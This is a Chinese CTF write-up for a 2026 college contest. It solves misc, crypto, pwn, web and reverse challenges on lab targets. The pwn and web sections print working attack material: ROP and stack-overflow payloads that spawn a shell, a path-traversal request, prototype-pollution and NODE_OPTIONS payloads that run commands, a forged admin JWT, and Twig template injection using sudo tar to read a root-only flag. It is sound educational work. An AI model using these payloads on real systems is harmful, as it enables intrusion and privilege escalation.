---
title: LRTCTF2026决赛
date: '2026-11-08 18:10:13'
tags: []
categories:
  - CTF-Writeups
slug: LRTCTF2026决赛
permalink: /lrtctf2026
draft: false
---

# 重庆第二师范学院2026网络安全大赛

## MISC

### girl

下载下来后先解压，不过需要密码，可能是真加密也可能是伪加密，先用随波逐流试一下，结果是伪加密。

![随波逐流检测出 ZIP 伪加密](/images/20261108181014.png)

解密后的压缩包里面有个 girl 的图片，继续拖入随波逐流。

![随波逐流的图片分析结果](/images/20261108181014_1.png)

不过是假的 flag，同时随波逐流给了一个 16 进制文本。

在 010 Editor 之类工具里把 JPEG 尾部那 6692 字节导出成 hex 文本，得到：

![导出的十六进制文本](/images/20261108181014_2.png)

还原出来是一张二维码：

![还原出的二维码](/images/20261108181014_3.png)

扫码后得到：

```
你好！lrtctf{139e1603741c4ffb4a88a7776d79ab6f}
```
### USB

附件是个 pcap，名字就叫 `mouse_trajectory`。先别急着写脚本，用 tshark 看一眼协议分层。

```bash
tshark -r mouse_trajectory.pcap -q -z io,phs
```

整包 1763 帧全是 USB，一条 IP/TCP 都没有，说明是设备流量题。再看设备地址、端点、传输类型：

```bash
tshark -r mouse_trajectory.pcap -T fields \
  -e usb.device_address -e usb.endpoint_address -e usb.transfer_type \
  | sort | uniq -c
```

```
1763  2   0x81   0x01
```

只有一台设备，端点 `0x81`（IN 方向、端点号 1），传输类型 `0x01` 是 `URB_INTERRUPT`。中断 IN 加小包，典型的 HID 设备。

![tshark 看到的协议分层和端点统计](/images/20261108181014_4.png)

抓一帧看结构：

```bash
tshark -r mouse_trajectory.pcap -c 1 -V
```

关键几行：

```
URB transfer type: URB_INTERRUPT (0x01)
Endpoint: 0x81, Direction: IN
Device: 2
Data length [bytes]: 4
Leftover Capture Data: 000c0c00
```

数据长 4 字节，内容是 `00 0c 0c 00`。对照 USB HID Boot Protocol 的鼠标报告格式：

| 字节 | 含义 |
| --- | --- |
| 0 | 按键位图，bit0 是左键 |
| 1 | X 位移，有符号 8 位 |
| 2 | Y 位移，有符号 8 位 |
| 3 | 滚轮 |

所以第一帧的意思是"没按键，光标往右下各走 12 个单位"。

这里有个前提：**这个包没有设备描述符**，Wireshark 不知道它是鼠标，数据只显示成 `Leftover Capture Data`，必须自己按 Boot Protocol 拆。

把 1763 帧的数据全导出来：

```bash
tshark -r mouse_trajectory.pcap -T fields -e frame.number -e usb.capdata > raw.txt
```

前几行：

```
1	000c0c00
2	01000000
3	01000000
4	00000000
5	01000000
6	01003c00
```

规律很明显：`01000000` 是左键按下但没有移动，`00000000` 是松开也没移动，`01003c00` 是按住并且 Y 方向 +60。

统计按键字节，`0x00` 有 599 帧，`0x01` 有 1164 帧。也就是 1164 帧在"按下"状态，599 帧是松开的。

松开状态下的移动不能算进笔画。那是抬笔挪到下一个位置，算进去整个字会糊成一片。

再看位移的取值范围：

```
dx 范围: -127 .. 96
dy 范围: -72 .. 72
dx 最常见: 0(1391), -12(139), 12(88), 24(38), 36(29), 48(20)
dy 最常见: 0(1486), -12(121), 12(76), 24(24), -24(21)
```

**所有位移都是 12 的整数倍**，说明记录的时候鼠标灵敏度把一格量化成了 12 个单位。这个是后面定网格步长的依据。

接下来把相对位移累加成绝对坐标，只在按下时记录：

```python
x = y = 0
for btn, dx, dy in rows:
    x += dx
    y += dy
    if btn & 1:
        points.append((x, y))
```

跑完看范围：

```
坐标范围: X 0 .. 2652   Y 0 .. 72
按下点数 1164
```

Y 只有 0 到 72，X 到 2652，宽高比 37:1，明显是一行字。按 12 的粒度换算，X 是 222 列，Y 是 7 行。

**222 × 7，这就是一行 5×7 点阵字。**

![相对位移累加成绝对坐标，蓝色才是笔画](/images/20261108181014_5.png)

坐标除以 12 取整落到网格，去重之后按行列打印：

```python
cells = set((px // 12, py // 12) for px, py in points)
for r in range(7):
    print(''.join('#' if (c, r) in cells else ' ' for c in range(222)))
```

出来是这样：

```
  ##    ###    ###   #####     #    ###    ###    ###    ###
 #  #  #   #  #   #  #        ##   #   #  #   #  #   #  #   #
 #     #   #  #   #  ####    # #   #   #  #   #      #  #   #
# #    #   #   ###       #  #  #   #   #   ###      #    ####
 #     #   #  #   #      #  ### #  #   #  #   #    #        #
 #     #   #  #   #  #   #     #   #   #  #   #   #        #
 #      ###    ###    ###      #    ###    ###   #####   ##
```

肉眼能看出是字，但直接读容易翻车，尤其 `b`/`h`、`f`/`6` 这种。

![还原出来的点阵](/images/20261108181014_6.png)

按整列全空的地方切字符：

```python
empty = [all(grid[r][c] == 0 for r in range(7)) for c in range(222)]
```

切出 32 个字符块，大部分宽 5 列、间隔 2 列。有一个块只宽 3 列（列 113-115），那是窄字符 `1`。

然后建一个 5×7 字体表做模板匹配，逐位异或算汉明距离取最小。字体表的字形不是凭空写的，是从上一步打印出来的图形里反推的——比如第 2 个块是 `01110 / 10001 / ... / 01110` 这种无斜线的 `0`，常见字体表里带斜线的版本对不上。

有两处要特殊处理。

**第一处**，第 17 块是 3 列宽的 `1`：

```
010
110
010
010
010
010
111
```

模板里的 `1` 是 5 列宽，位对齐之后距离算出来 7 分，被误判成 `t`。换成 3 列宽的模板就对上了。

**第二处**，第 19 块到底是 `b` 还是 `h`：

```
r0: 10000
r1: 10000
r2: 10110
r3: 11001
r4: 10001
r5: 10001
r6: 11110   <- 底行左对齐
```

`h` 的底行是 `10001`，`b` 的底行是 `11110`。实测是 `11110`，所以判 `b`，距离 0，`h` 距离 4。这个要是判错，最后会得到一串含 `h` 的非法 hex。

识别完不能直接信，把结果重新渲染回去跟原图逐位比对：

```
不符: #1  'f' 列0-4
不符: #5  '4' 列28-32
不符: #20 '4' 列133-137
不符: #23 'f' 列154-158
逐位完全一致的块数: 28 / 32
```

4 个块各差 1 个点，是鼠标画的时候漏点（`f` 的中间横线少一格、`4` 的斜线少一格），不影响判字。

最后得到 32 个字符：

```
f08540829e577d6517b4ecf60de8e79a
```

长度 32，全是 `0-9a-f`，按 8-4-4-4-12 分组正好是 UUID 的结构（`f0854082-9e57-7d65-17b4-ecf60de8e79a`），只是画的时候没把横线画出来。

```
lrtctf{f08540829e577d6517b4ecf60de8e79a}
```

### 取证

4GB 的 memory.dmp，开头魔数是 `EMiL`，LiME（Linux Memory Extractor）格式的 Linux 内存转储，不是 Windows 的 dmp。volatility 要配 Linux profile，这里直接当 4GB 大文件 grep。

![文件头识别 LiME 格式](/images/20261108181014_7.png)

grep 全盘搜 flag：

![grep 出两串明文 flag](/images/20261108181014_8.png)

搜出来两串 `flag{m3m0ry_1s_4lw4ys_th3r3}` 和 `flag{h1dd3n_pr0c3ss_r00tk1t}`，但注意两个问题：一是格式是 `flag{}` 不是 `lrtctf{}`，二是这么明晃晃的八成是幌子，`lrtctf{` 全文一处都没有。

换个思路搜出题残留。拿脚本里的特征串 `VICTIM_DIR` 当锚点，从页缓存里把出题脚本 `build_challenge.sh` 整个抠出来了：

![从页缓存抠出的 build_challenge.sh](/images/20261108181014_9.png)

出题逻辑一目了然：flag.txt 写完后在 tmux 会话里用 openssl 加密到 /tmp/.backup.enc，然后删除原文件；攻击命令逐条 send-keys 进交互式 bash，全部进入内存里的 history 链表；磁盘上的 ~/.bash_history 反而被删了——考点就在这，历史要来内存里找。

bash 历史恢复，攻击者执行的命令原文全在：

![内存里恢复的 bash 历史](/images/20261108181014_10.png)

```bash
openssl enc -aes-256-cbc -salt -in /home/user/secret_data/flag.txt \
  -out /tmp/.backup.enc -k "P@ssw0rd_linux_mem_2024"
```

`SECRET_NOTE` 也交代了："the key is not deleted, look into bash history"。

bash 堆里的 FLAG 变量带着长度前缀 `0x1d`（正好 29 字节），说明出题人没用 `--flag` 参数覆盖默认值，flag.txt 的内容就是 `flag{m3m0ry_1s_4lw4ys_th3r3}`。另一个 `flag{h1dd3n_pr0c3ss_r00tk1t}` 是 rootkit 分支的（hideproc.ko 隐藏持有 hidden_flag 的进程），root bash 内存里能找到那条命令的词结构，应该是隐藏进程那问的答案。

全盘有个孤立的 `rtctf` 片段是假阳性：`ctfconvert` 和 `ctfutils` 两个包名连在一起正好拼出 `rtctf`。

题目 flag 用的是 `flag{}` 格式，按平台要求加前缀提交。

```
lrtctf{m3m0ry_1s_4lw4ys_th3r3}
```

### 听音

36 秒的 `morse_noisy.wav`，名字就说了是带噪莫斯电码。先看频谱，能量集中在一根 800Hz 的谱线上：

![频谱，800Hz 一根尖峰](/images/20261108181014_11.png)

但噪声比信号还响：音调幅度才 5000，噪声标准差 1 万，直接取包络完全糊掉，信噪比是负的。

对策是 FFT 窄带滤波，只保留 750~850Hz，带外噪声全部清零（噪声功率降了将近 500 倍），包络立刻变成清晰双峰：

![窄带滤波后的包络，双峰加阈值](/images/20261108181014_12.png)

低峰是噪声底（约 600），高峰是信号（约 11000），阈值取中间 5000 切分，135 个音段，时序干净得离谱：点 76.4ms、划 236.3ms，比例正好 3:1；字内间隔 83.8ms、字符间隔 243.7ms。

解码的顺序是先按间隔切分字符、再累加符号。反过来的话，上一字符的缓冲会混进下一字符的首符号，解出来全是 `--..-` 这种非法序列：

```python
for s, e in runs:
    if prev_end is not None:
        gap = s - prev_end
        if gap > char_gap:              # 先按间隔切字符
            out(MORSE.get(current, '?'))
            current = ''
    current += '.' if dur < dot*2 else '-'   # 再累加符号
```

解码出 32 位十六进制：

![解码输出](/images/20261108181014_13.png)

```
04420FEED1585E1A5688C4867CE103C3
```

```
lrtctf{04420feed1585e1a5688c4867ce103c3}
```

## CRYPTO

### Silent Broadcast

附件 `silent_broadcast.py` 把解法函数都留在文件里了：`merge_packets` 是 CRT 合并，`integer_cube_root` 是二分开立方，等于明示这是 Håstad 广播攻击。同一条消息用 e=3 发给 alpha/beta/gamma 三个不同模数的终端，而且没加 padding。

注意三份 data 是完全一样的，说明 m³ 连最小的模数都没碰到，密文就是裸的 m³，其实 CRT 都可以跳过直接开立方。

直接 exec 它自带的函数：

```python
ns = {}
exec(open('silent_broadcast.py').read(), ns)
x = ns['merge_packets'](ns['packets'])
print(x == ns['packets'][0]['data'])   # True，说明立方根一定精确
m = ns['integer_cube_root'](x)
print(ns['number_to_bytes'](m))
```

backup 那个 e=65537、n 只有 39 位的纯属烟雾弹，不用管。

```
lrtctf{h4st4d_br0adc4st_1s_n0t_s4fe}
```

### 口算

附件 `rsa.py` 把参数全写在明面上了：`p=61`、`q=53`、`e=17`、`m=65`，脚本自己算 `n`、`phi`、`d`，最后打印 `n`、`e`、`c`。

先把公开参数和私钥手算出来：

```
n = 61 × 53 = 3233
φ(n) = 60 × 52 = 3120
```

求 `d` 就是解 `17d ≡ 1 (mod 3120)`，用扩展欧几里得：

```
3120 = 183 × 17 + 9
17   = 1 × 9 + 8
9    = 1 × 8 + 1
```

回代：

```
1 = 9 - 8
  = 9 - (17 - 9) = 2 × 9 - 17
  = 2 × (3120 - 183 × 17) - 17
  = 2 × 3120 - 367 × 17
```

所以 `d ≡ -367 ≡ 2753 (mod 3120)`。验算一下 `17 × 2753 = 46801 = 15 × 3120 + 1`，对。

脚本跑出来 `c = 2790`，解密就是算 `2790^2753 mod 3233`。指数太大，用 CRT 拆成模 `p`、模 `q`：

```
c mod 61 = 45        c mod 53 = 34
dp = 2753 mod 60 = 53    dq = 2753 mod 52 = 49
mp = 45^53 mod 61 = 4     mq = 34^49 mod 53 = 12
```

合并用 CRT，`p mod q = 8`，逆元是 `20`：

```
m = mp + p × ((mq - mp) × 20 mod 53)
  = 4 + 61 × (8 × 20 mod 53)
  = 4 + 61 × 1
  = 65
```

最后回代验一遍 `65^17 mod 3233 = 2790`，和脚本的 `c` 对上，说明解出来的明文 `m = 65` 没问题。

```
lrtctf{65}
```
### ez_23@
解：
```python
from Crypto.Util.number import long_to_bytes, inverse
def egcd(a, b):
    if b == 0:
        return (a, 1, 0)
    g, x, y = egcd(b, a % b)
    return (g, y, x - (a // b) * y)
n = 98431514160887347271189769602169191951513258485773947455606372502958270253217575729450758538759746913329549019298102926080143126585286702387524230478879382793217326618989030707925842715078486852366475683112165008249549264898926383259641085248861867606940137730183444091542668451702335703716374378819558470583
e1, c1 = 65537, 41430169705919591464045305283843887516857601814606429122868169321811710472235615660605172933859621784859162136537003799698836903164282904050692156423576548846402849159339992767083708701214116277226265698503031091222874007004290688235596976071157295913782023974901717644923547515310749635943256341245695418912
e2, c2 = 17, 67710393944851194619933845787696198747640939480699751252185025856408860932160625815279872238417746390747470516817475115718413448993398698630461649870348008482767224423425492502977024555769667205141448269181966828389809652633381132581953741165322840449578244785502008163883930298743514028283939687565893796953
g, a, b = egcd(e1, e2)
assert g == 1
if a < 0:
    a = -a
    c1 = inverse(c1, n)
if b < 0:
    b = -b
    c2 = inverse(c2, n)
m = pow(c1, a, n) * pow(c2, b, n) % n
print(long_to_bytes(m).decode())
```
## PWN

### Overstack

附件 stackstart，no PIE 无符号表，字符串全被 XOR 0x5A 藏着，找到 key 解出来是个 Courier Console 菜单：1) draft 2) send 3) quit。

两个洞一起用：draft 里 read 完直接 printf(buf)，格式化字符串；send 里 read(0, rbp-0x70, 0x180)，能写 384 字节，栈溢出。

0x4014e9 有个 win 函数，rdi 等于 "COURIER!"（0x434f555249455221）就 fopen("/flag") 打印，0x4014d0 还有现成的 pop rdi; ret。

流程：draft 发 `%29$p|%31$p`，leak 出 canary 和返回地址。canary 落在第 29 个参数位，27 位泄漏的是个栈残留值；`%31$p` 正好是 0x4018c9，用来交叉验证索引没偏。再选 send 发 152 字节：

```python
payload  = b'A'*104 + p64(canary) + b'B'*8
payload += p64(0x4014d1) + p64(0x4014d0) + p64(0x434f555249455221) + p64(0x4014e9)
```

开头加个 ret 是为了栈对齐防 movaps，canary 填回原值就能过检查，leave;ret 之后直接进 ROP。

draft 里还有一条校验：输入的 FNV-1a 哈希如果恰好是 0x13371337，只打印一句 legacy password rejected，与流程无关。

```
lrtctf{ef88577f-19b1-4385-8e70-fa5f3bff2504}
```

### Tilde

附件是个 16K 的 x86-64 ELF，符号表没剥，checksec 出来 no PIE、NX 开、没有 canary、Partial RELRO。

跑起来是个菜单，四个功能，实际能打的只有第一个：

![菜单和 checksec](/images/20261108181014_14.png)

选 1 之后先问 scratch length，再问 path，最后打印一行 `[*] literal:` 把读到的内容回显出来。反汇编看这几个函数：

![expand_tilde 的 VLA 和拷贝循环](/images/20261108181014_15.png)

`read_line_raw` 把 path 读进全局缓冲（0x1000 大小，随便写），`memcpy` 再拷一份到另一个全局，最后 `expand_tilde` 里按 scratch length 开 VLA，把字符串往栈上无边界拷贝。拷贝循环只认 `\0` 结尾，没有长度上限。

栈帧里 `[rbp-0x30]` 存的是 buf 指针、`[rbp-8]` 是循环变量 i，位置都在返回地址下面。所以单纯把字符串拉长没用：长度一过这两个槽，函数后面的 `buf[i] = 0` 就会往垃圾地址写，进程在 ret 之前就死了，崩溃点固定在 VLA+108 附近。

绕开这一层的是 `sub rsp, rax` 那句。VLA 大小算出来是 `((n+24)/16)*16`，n 来自 `strtoull`，是 size_t，负数按 64 位回绕：

![回绕计算](/images/20261108181014_16.png)

n 取 -104，VLA 变成 `0xffffffffffffffb0`，`rbp - 0x50 - 0xffffffffffffffb0` 正好等于 rbp。栈指针被“减”到了 rbp 上，align 完 buf 直接落在 saved rbp，整个局部变量区被完整跳过。

payload 只有 11 字节。前 8 字节填 saved rbp，后 3 字节改返回地址：

```python
payload = b'/bin/sh;' + p64(0x401794)
```

0x401794 是 main 里 `system("clear")` 那条 `call 0x4010e0`。走 call 而不是 ret，栈对齐天然是对的，不用额外垫一个 ret；这时候 rdi 还停在 0x4050e0 上，指向的正是 payload 自己，system 拿到的参数就是 `/bin/sh;`，分号后面的字节交给 shell 处理掉。

打过去直接是 shell：

![拿 shell 读 flag](/images/20261108181014_17.png)

```
lrtctf{de03d9f2-0fde-4b47-aca4-2af7a9263951}
```

## WEB

### LrtMall 数码商城

先查看页面源码，发现这样一段 js：

```js
document.querySelectorAll('.pimg').forEach(function (img) {
  var file = img.getAttribute('data-file');
  fetch('/load_image', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'filename=' + encodeURIComponent(file),
    cache: 'no-store'
  })
    .then(function (r) {
      if (!r.ok) throw new Error('failed');
      return r.blob();
    })
    .then(function (blob) {
      img.src = URL.createObjectURL(blob);
      var loading = img.nextElementSibling;
      if (loading) loading.style.display = 'none';
    })
    .catch(function () {
      img.alt = '图片加载失败';
      var loading = img.nextElementSibling;
      if (loading) loading.textContent = '图片加载失败';
    });
});
```

这里很明显是可以做文件读取或者目录穿越的点：访问 `/load_image`，POST 请求带 `filename` 参数。

请求包：

```
POST /load_image HTTP/1.1
Host: 10.3.37.51:33677
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

filename=../../../flag
```

![目录穿越读到 flag](/images/20261108181014_18.png)

### CronHub

首页打开只有一个 `/js/app.min.js`，逻辑都在这个文件里。看最后一行，`sourceMappingURL` 没删：

```
//# sourceMappingURL=app.min.js.map
```

直接请求 `/js/app.min.js.map`，`sourcesContent` 里是打包前的服务端 `app.js`，整份源码就拿到了。

先看配置合并的 `merge`：

```js
function merge(dst, src) {
  for (const k in src) {
    if (k === "__proto__") continue;
    if (isObj(src[k]) && isObj(dst[k])) merge(dst[k], src[k]);
    else dst[k] = src[k];
  }
}
```

只挡了 `__proto__`，`constructor` 没管。再看 `/admin` 的判断：

```js
const user = users[0] || {};
if (user.isAdmin || user.role === "admin") {
  return res.sendFile(path.join(__dirname, "public", "admin.html"));
}
```

`users[0]` 是 `{name:"guest", role:"user"}`，本身没有 `isAdmin`，会沿原型链去找。那先把 `Object.prototype.isAdmin` 污染掉：

```json
{"constructor":{"prototype":{"isAdmin":"true"}}}
```

POST 到 `/api/update`：

```
POST /api/update HTTP/1.1
Host: 10.3.37.51:33705
Content-Type: application/json
Content-Length: 48

{"constructor":{"prototype":{"isAdmin":"true"}}}
```

返回 `{"status":"ok",...}`。再访问 `/admin`，之前是 403，现在是 200，管理员权限拿到了。

![原型链污染 isAdmin 之后 /api/update 的响应](/images/20261108181014_19.png)

接着看任务执行的地方：

```js
const opts = { stdio: "pipe" };
const child = spawn(process.execPath, [WORKER, id], opts);
```

`opts` 是个普通对象，没有自己的 `env`，读 `opts.env` 时会顺着原型链拿到 `Object.prototype.env`。所以再污染一个 `env`，让子进程的环境变量变成我们控制的：

```
POST /api/update HTTP/1.1
Host: 10.3.37.51:33705
Content-Type: application/json

{"constructor":{"prototype":{"env":{
  "A":"process.stdout.write(require('child_process').execSync('cat /flag').toString())//",
  "NODE_OPTIONS":"--require /proc/self/environ"
}}}}
```

这里用 `--require /proc/self/environ`：子进程启动时会把这个文件当 JS 加载，环境变量拼出来的内容第一行是 `A=process.stdout.write(...)`，本身就是合法的赋值语句，末尾的 `//` 把后面的环境变量注释掉。

发完 `/api/update`，再 POST `/api/jobs/run`，拿到 `jobId` 后轮询 `/api/jobs/<jobId>`：

```
POST /api/jobs/run HTTP/1.1
Host: 10.3.37.51:33705
Content-Length: 0
```

```
GET /api/jobs/20ff095879036109 HTTP/1.1
Host: 10.3.37.51:33705
```

![轮询 job 拿到命令回显](/images/20261108181014_20.png)

```
lrtctf{NodE_j5_?_b9f553df74d9}
```
### 阿巴巴巴

访问首页，响应头里直接下发了一个 `auth` cookie：

```
Set-Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdC0yN2JmNDMiLCJyb2xlIjoidXNlciIsImlhdCI6MTc5NDEyMTM1Nn0.AmZ07Je_hC8P0kzpVmKq1jTOcFiKBzAXvQX1I3VaQM8
```

把 JWT 前两段 base64url 解开：

```
header:  {"alg":"HS256","typ":"JWT"}
payload: {"sub":"guest-27bf43","role":"user","iat":1794121356}
```

签名用的是弱密钥 `secret`，HMAC-SHA256 能对上。也就是说可以直接用这个密钥签任意 claims，把 `role` 改成 `admin`，`sub` 改成 `admin`：

```json
{"sub":"admin","role":"admin","iat":1794121356}
```

带上重签后的 cookie 访问管理台：

```
GET /admin/ HTTP/1.1
Host: 10.3.37.51:33951
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDEyMTM1Nn0.VQMzRgSrLlvN58ErwHmep0dFB582z5lnQJHAN2johMU
```

返回 200，页面从 403 的“需要管理员权限”变成“通知模板”编辑框，右上角显示 admin。

![换成 admin 身份的 JWT 后 /admin/ 返回 200](/images/20261108181014_21.png)

管理台只有一个模板编辑框，POST 时服务端直接 `createTemplate()->render()`，并没有真的审核队列。先提交一个 sleep 模板试执行：

```
POST /admin/ HTTP/1.1
Host: 10.3.37.51:33951
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDEyMTM1Nn0.VQMzRgSrLlvN58ErwHmep0dFB582z5lnQJHAN2johMU
Content-Type: application/x-www-form-urlencoded

tpl={{['sleep 20']|map('system')|join}}
```

正常请求几十毫秒就返回，这里整个请求卡了 20 秒，说明 Twig 的 `map('system')` 被执行了。

服务端渲染代码（`admin/index.php`）：

```php
$twig = new \Twig\Environment(new \Twig\Loader\ArrayLoader([]));
$twig->createTemplate($snippet)->render(['site' => 'LabOps']);
```

当前身份是 `www-data`。把 `id` 写到 Web 可读的 `uploads` 目录，再直接用 GET 取：

```
POST /admin/ HTTP/1.1
Host: 10.3.37.51:33951
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDEyMTM1Nn0.VQMzRgSrLlvN58ErwHmep0dFB582z5lnQJHAN2johMU
Content-Type: application/x-www-form-urlencoded

tpl={{['id > /var/www/html/uploads/id.txt']|map('system')|join}}
```

```
GET /uploads/id.txt HTTP/1.1
Host: 10.3.37.51:33951
```

返回：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`/root/flag` 是 600、root 所有，www-data 读不了。`sudo -l` 里有一条现成的：

```
(root) NOPASSWD: /usr/bin/tar
```

用 tar 以 root 身份把 flag 打进归档，重定向到 uploads：

```
POST /admin/ HTTP/1.1
Host: 10.3.37.51:33951
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDEyMTM1Nn0.VQMzRgSrLlvN58ErwHmep0dFB582z5lnQJHAN2johMU
Content-Type: application/x-www-form-urlencoded

tpl={{['sudo -n /usr/bin/tar -cf - /root/flag > /var/www/html/uploads/flag.tar']|map('system')|join}}
```

![借 sudo tar 把 flag 打进 uploads](/images/20261108181014_22.png)

```
GET /uploads/flag.tar HTTP/1.1
Host: 10.3.37.51:33951
```

tar 里就是：

```
lrtctf{1b2228f0-a3ad-4d21-8c92-4a019dc74793}
```

## REVERSE

### GoBack

附件 `go_back.py`，encode 四步：up 把每个字符 ord<<1 转成 8 位二进制拼一起；right(x,d) 是左旋 d 位；down 是按位取反；left 不是单纯的旋转，是先 right(x, len-d) 再把整串反过来。

密文 144 位正好 18 个字符，按题目说的从最后一步倒推：left 里的反转自己就是自己的逆，先 `[::-1]` 变回去，再 `right(t, 24)` 抵消旋转（24+(L-24)=L，转一整圈等于没转）；down 自反，再取反一次；开头的 `right(x,24)` 用 `right(r, L-24)` 抵消；最后每 8 位右移一位拿回字符。

密文：

```
1010000010101100101001001011110010001110101101001001101010000100
1011110010110100111100101001000011001100111010001001110011101000
1101100011100100
```

倒推完 18 个字符：

```
lrtctf{XiaoSiGame}
```

### HRDrev

先看文件类型和字符串：

```bash
file challenge2.exe
strings challenge2.exe | grep -E 'UPX|bytecode|opcode|register'
```

`file` 显示 PE32+，`strings` 里能看到 `UPX0`、`UPX1`、`UPX2`、`UPX!`，是 UPX 加壳。先脱壳：

```bash
upx -d challenge2.exe
```

![PE 节表，三个 UPX 节（challenge2.exe，按实际输出整理）](/images/20261108181014_23.png)

脱完再 `strings`，能看到 `bytecode.bin`、`Unknown opcode: 0x`、`Invalid register.`、`Correct!`、`Wrong!`，说明程序会读外部字节码自己解释执行。

跑一下，打印 `LRTCTF Reverse Challenge`，输入 flag；长度不对只提示 `Wrong!`。

看 main：读入字符串后先比较长度 `0x2e`（46 字节），然后拼出 `bytecode.bin` 读文件，初始化 VM 结构再调解释器。VM 结构大致是：

```
[rcx+0x20]  pc
[rcx+0x24]  cmp 标志
[rcx+0x28]  字节码起始
[rcx+0x30]  字节码结束
[rcx+0x40]  输入缓冲区起始（LOAD16 从这里读）
[rcx+0x48]  输入缓冲区结束
rcx+0..0x1c  8 个 32 位寄存器 r0-r7
```

解释器取一个字节当 opcode，`> 0xd` 时单独处理 `0xff`，其余走 `0x1400060ac` 的跳转表。把每个 handler 对一遍，指令集是：

| opcode | 含义 |
| --- | --- |
| 1 | MOV reg, imm32 |
| 2 | MOV reg, reg |
| 3/4/5 | XOR/ADD/SUB reg, reg |
| 6/10 | ROL reg, imm8 |
| 7 | LOAD16 reg, [addr16]（从输入缓冲区小端读 2 字节） |
| 8 | XOR reg, imm32 |
| 9 | ADD reg, imm32 |
| 11 | CMP reg, imm32，结果写进 cmp 标志 |
| 12 | JNE addr16（cmp 为 0 时跳） |
| 13 | JMP addr16 |
| 0xFF | HALT：r0==0x600df00d 成功，0xbad0bad0 失败 |

`bytecode.bin` 一共 865 字节，前面一眼能看出是 37 字节一块，正好 23 块，对应 46 字节输入里的 23 对字符。第一块字节：

```
07 00 00 00 08 00 68 24 57 13 09 00 57 13 68 24
0a 00 05 01 01 66 2b ed f7 03 00 01 0b 00 00 00
00 00 0c 5a 03
```

按指令集逐字节解：

```
LOAD16 r0, [0x0000]      ; 07 00 00 00
XOR    r0, 0x13572468    ; 08 + imm32
ADD    r0, 0x24681357    ; 09 + imm32
ROL    r0, 5             ; 0a 00 05
MOV    r1, 0xf7ed2b66    ; 01 01 + imm32
XOR    r0, r1            ; 03 00 01
CMP    r0, 0             ; 0b 00 + 4 字节 0
JNE    0x035a            ; 0c 5a 03
```

每块结构一样，只有立即数和 ROL 位数不同，LOAD16 的地址依次是 0、2、4……44。

先手解第一块。要求最后 `r0 == 0`：

```
((x ^ 0x13572468) + 0x24681357) rol 5 ^ 0xf7ed2b66 == 0
```

反过来：

```
x = ((ror(0xf7ed2b66, 5) - 0x24681357) mod 2^32) ^ 0x13572468
  = (0x37bf695b - 0x24681357) ^ 0x13572468
  = 0x13575604 ^ 0x13572468
  = 0x726c
```

`0x726c` 小端取两字节是 `6c 72`，也就是 `l`、`r`。后面的块同理，把每块的 A/B/C/D 提出来代入公式：

| 偏移 | A (XOR) | B (ADD) | C (ROL) | D | x | 字符 |
| --- | --- | --- | --- | --- | --- | --- |
| 0 | 13572468 | 24681357 | 5 | f7ed2b66 | 726c | lr |
| 2 | 13573449 | 24684498 | 8 | bf9bd537 | 6374 | tc |
| 4 | 1357042a | 246875d9 | 11 | fec1b9bd | 6674 | tf |
| 6 | 1357140b | 2468a71a | 14 | f9e28def | 547b | {T |
| 8 | 135764ec | 2468d85b | 17 | 5bbe6f80 | 3168 | h1 |
| 10 | 135774cd | 2469099c | 20 | 55a37c03 | 5f73 | s_ |
| 12 | 135744ae | 24693add | 23 | 6c9be02e | 6552 | Re |
| 14 | 1357548f | 24696c1e | 26 | dcdf034f | 3356 | V3 |
| 16 | 1357a560 | 24699d5f | 29 | 26f825ae | 3572 | r5 |
| 18 | 1357b541 | 2469cea0 | 0 | 37c1b912 | 5f33 | 3_ |
| 20 | 13578522 | 2469ffe1 | 3 | be0d89b9 | 3474 | t4 |
| 22 | 13579503 | 246a3122 | 6 | f08be48d | 6b73 | sk |
| 24 | 1357e5e4 | 246a6263 | 9 | 846e3c6f | 315f | _1 |
| 26 | 1357f5c5 | 246a93a4 | 12 | 23e5a37c | 5f73 | s_ |
| 28 | 1357c5a6 | 246ac4e5 | 15 | 2fbb9be1 | 5f34 | 4_ |
| 30 | 1357d587 | 246af626 | 18 | 6c2cdf0b | 3162 | b1 |
| 32 | 13562678 | 246b2767 | 21 | 0e66f834 | 5f74 | t_ |
| 34 | 13563659 | 246b58a8 | 24 | e237c1b6 | 6863 | ch |
| 36 | 1356063a | 246b89e9 | 27 | b9be0f9f | 6c34 | 4l |
| 38 | 1356161b | 246bbb2a | 30 | 4df07828 | 336c | l3 |
| 40 | 135666fc | 246bec6b | 1 | 6f83dbfa | 676e | ng |
| 42 | 135676dd | 246c1dac | 4 | 7c236983 | 6e31 | 1n |
| 44 | 135646be | 246c4eed | 7 | e145631b | 7d67 | g} |

拼起来就是 `lrtctf{Th1s_ReV3r53_t4sk_1s_4_b1t_ch4ll3ng1ng}`。

最后喂回原程序确认：

```bash
echo 'lrtctf{Th1s_ReV3r53_t4sk_1s_4_b1t_ch4ll3ng1ng}' | ./challenge2.exe
```

输出 `Correct!`，没解错。

```
lrtctf{Th1s_ReV3r53_t4sk_1s_4_b1t_ch4ll3ng1ng}
```

### 数学高手

`file ez2` 是个 14KB 的 ELF64。直接跑：

```
$ ./ez2
===================================
   Math is the queen of sciences!
===================================
Please enter the flag: test
Wrong length!
```

